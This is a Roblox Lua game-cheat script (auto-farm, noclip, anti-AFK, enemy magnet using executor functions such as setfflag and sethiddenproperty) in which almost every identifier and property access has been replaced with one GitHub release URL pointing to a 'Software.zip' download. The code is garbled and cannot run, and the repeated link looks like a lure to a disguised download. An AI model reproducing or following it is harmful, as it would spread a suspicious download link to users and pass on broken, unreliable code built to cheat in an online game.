                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 255, 255)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 155, 255)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 0, 255)}):Play() 
                 wait(.5)
 
                 game:GetService('TweenService'):Create(
                     Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                 {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 0, 155)}):Play() 
                 wait(.5)
             end 
     elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyClip") then
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
         end
        end
    end)
 end)
end)

spawn(function()
    while true do game:GetService("RunService").RenderStepped:Wait()
        if Clip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or AutoKaitan then
            if syn and  https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Humanoid") then
                setfflag("HumanoidParallelRemoveNoPhysics", "False")
                setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(7)
            end
        end
    end
end)

spawn(function()
    pcall(function()
        while game:GetService("RunService").Heartbeat:wait() do
            if Noclip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or AutoKaitan then
                if game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 1 then
					if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyClip") then
						local Noclip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyVelocity")
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "BodyClip"
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(150000,150000,150000)
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,0,0)
             while true do 
                wait(0.1) 
                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 0, 0)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 155, 0)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 0)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 255, 0)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 255, 255)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 155, 255)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 0, 255)}):Play() 
                wait(.5)

                game:GetService('TweenService'):Create(
                    Paertaiteen,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
                {Color = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 0, 155)}):Play() 
                wait(.5)
            end 
            elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BodyClip") then
                    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
			end
            end
		end
    end
end)
end)

spawn(function()
    pcall(function()
        game:GetService("RunService").Stepped:Connect(function()
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or AutoKaitan then
                for _, v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
                    if v:IsA("BasePart") then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false    
                    end
                end
            end
        end)
    end)
end)

function EquipWeapon(ToolSe)
    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe) then
        local tool = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe)
        wait(.4)
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tool)
    end
end

--distande Auto Farm

Type = 1
spawn(function()
    while wait(.1) do
        if Type == 1 then
            Farm_Mode = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 10,10)
        elseif Type == 2 then
            Farm_Mode = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 10,10)
        end
    end
end)

spawn(function()
    while wait(.1) do
        Type = 1
        wait(5)
        Type = 2
        wait(5)
    end
end)

pcall(function()
    for _, v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
		if v:IsA("BasePart") then
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false    
        end
    end
end)

spawn(function()
    while wait() do
        if Auto_Farm then
            if game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false then
                MagnetActive = false
                CheckLevel()
                TP(CFrameQ)
                if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 4 then
                    wait(1.1)
                    CheckLevel()
                    if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 20 then
                        game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("StartQuest", NameQuest, QuestLv)
                        game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("SetSpawnPoint")
                    else
                        TP(CFrameQ)
                    end
                end
            elseif game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == true then
                pcall(function()
                    CheckLevel()
                    if game:GetService("Workspace").Enemies:FindFirstChild(Ms) then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms and v:FindFirstChild("Humanoid") then
                                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                                    repeat game:GetService("RunService").Heartbeat:wait()
                                        if game:GetService("Workspace").Enemies:FindFirstChild(Ms) then
                                            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, NameMon) then
                                                EquipWeapon(SelectToolWeapon)
                                                TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip * Farm_Mode)
                                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                                                game:GetService("VirtualUser"):CaptureController()
                                                game:GetService("VirtualUser"):Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 670),https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                                                PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                                                MagnetActive = true
                                            else
                                                MagnetActive = false    
                                                game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("AbandonQuest")
                                            end
                                        else
                                            MagnetActive = false
                                            CheckLevel()
                                            TP(CFrameMon)
                                        end
                                    until not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 0 or Auto_Farm == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false or not game:GetService("Workspace").Enemies:FindFirstChild(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                                end
                            end
                        end
                    else
                        MagnetActive = false
                        CheckLevel()
                        TP(CFrameMon)
                    end
                end)
            end
        end
    end
end)

spawn(function()
    while wait(.1) do
        if AutoBartilo then
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 850 and game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BartiloQuestProgress","Bartilo") == 0 then
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "Swan Pirates") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "50") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == true then 
                    if game:GetService("Workspace").Enemies:FindFirstChild("Swan Pirate [Lv. 775]") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Swan Pirate [Lv. 775]" then
                                pcall(function()
                                    repeat wait(.1)
                                        EquipWeapon(MiscFarmWeapon)
                                        game:GetService'VirtualUser':CaptureController()
                                        game:GetService'VirtualUser':Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 672))
                                        TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip * https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,15,0))
                                        require(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1000
                                        PosMonBartilo = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                                        MagnetBatilo = true
                                    until not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 0 or AutoBartilo == false or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == false
                                    MagnetBatilo = false
                                end)
                            end
                        end
                    else
                        MagnetBatilo = false
                        TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1057.92761, 137.614319, 1242.08069))
                    end
                else
                    TP2(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-456.28952, 73.0200958, 299.895966))
                    if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-456.28952, 73.0200958, 299.895966) - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 30 then
                        wait(1.1)
                        game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("StartQuest","BartiloQuest",1)
                    end
                end
            elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 850 and game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BartiloQuestProgress","Bartilo") == 1 then
                if QuestBartilo == nil then
                    TP2(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-456.28952, 73.0200958, 299.895966))
                end
                if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-456.28952, 73.0200958, 299.895966) - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 30 then
                    wait(1.1)
                    game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BartiloQuestProgress","Bartilo")
                    QuestBartilo = 1
                end
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Jeremy [Lv. 850] [Boss]") then
                    for i,v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Jeremy [Lv. 850] [Boss]" then
                            repeat wait(.1)
                                sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                                require(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1000
                                EquipWeapon(MiscFarmWeapon)
                                TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip * https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,15,6))
                                game:GetService'VirtualUser':CaptureController()
                                game:GetService'VirtualUser':Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 672))
                            until not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip <= 0 or AutoBartilo == false
                        end
                    end
                else
                    if QuestBartilo == 1 then
                        TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1931.5931396484, 402.67391967773, 956.52215576172))
                    end
                end
            elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 850 and game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BartiloQuestProgress","Bartilo") == 2 then
                TP2(game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = game:GetService("Workspace")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
                wait(1)
            end
        end 
    end
end)

warn("AFK")
local value = game:GetService("VirtualUser")
game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function()
   vu:Button2Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,0),https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
   wait(1)
   vu:Button2Up(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0,0),https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
end)

function Click()
    game:GetService'VirtualUser':CaptureController()
    game:GetService'VirtualUser':Button1Down(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1280, 672))
end

function AutoHaki()
    if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("HasBuso") then
        local args = {
            [1] = "Buso"
        }
        game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(unpack(args))
    end
end

spawn(function()
    while wait() do
        pcall(function()
            CheckLevel()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip and MagnetActive and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms and v:FindFirstChild("Humanoid") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Factory Staff [Lv. 800]" then
                            if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 250 then
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMon
                                sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                            end
                        elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms then
                            if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 400 then
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMon
                                sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                            end
                        end
                    end
                elseif FarmMasteryFruit and MasteryBFMagnetActive and MasteryMagnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Monkey [Lv. 14]" then
                        if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 250 then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonMasteryFruit
                            sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                        end
                    elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Factory Staff [Lv. 800]" then
                        if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 250 then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonMasteryFruit
                            sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                        end
                    elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms then
                        if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 400 then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonMasteryFruit
                            sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                        end
                    end
                elseif FarmMasteryGun and MasteryGunMagnetActive and MasteryMagnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Monkey [Lv. 14]" then
                        if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 250 then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonMasteryGun
                            sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                        end
                    elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Factory Staff [Lv. 800]" then
                        if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 250 then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonMasteryGun
                            sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                        end
                    elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms then
                        if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 400 then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonMasteryGun
                            sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                        end
